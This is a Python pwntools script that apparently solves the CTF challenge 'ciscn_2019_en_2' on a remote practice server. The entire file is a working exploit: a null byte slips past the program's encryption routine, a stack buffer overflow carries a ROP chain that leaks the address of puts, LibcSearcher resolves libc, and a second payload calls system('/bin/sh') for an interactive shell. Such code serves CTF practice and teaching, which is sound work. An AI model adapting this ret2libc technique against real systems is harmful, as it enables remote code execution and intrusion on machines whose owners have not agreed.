from pwn import *
from LibcSearcher import *
context.log_level = 'debug'


#io = process('./ciscn_2019_en_2')
io = remote('node4.buuoj.cn',27180)
elf = ELF('./ciscn_2019_en_2')
main_addr = elf.symbols['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_edi_ret = 0x400c83

payload1 = b'\0'+ (0x50 + 8 - 1)* b'a' + p64(pop_edi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)

io.recvuntil(b'Input your choice!')
io.sendline(b'1')
io.recvuntil(b'Input your Plaintext to be encrypted')
io.sendline(payload1)
io.recvuntil(b'Ciphertext\n')
io.recvuntil(b'\n')

puts_addr = u64(io.recv(7)[:-1].ljust(8,b'\x00'))
libc = LibcSearcher('puts', puts_addr)

libcbase = puts_addr - libc.dump('puts')
sys_addr = libcbase + libc.dump('system')
bin_sh = libcbase + libc.dump('str_bin_sh')

ret_addr = 0x4006b9
payload2 = b'\0'+ (0x50 + 8 - 1)* b'a' + p64(ret_addr) + p64(pop_edi_ret) + p64(bin_sh) + p64(sys_addr)
io.sendline(b'1')
io.recvuntil(b'Input your Plaintext to be encrypted')
io.sendline(payload2)
io.interactive()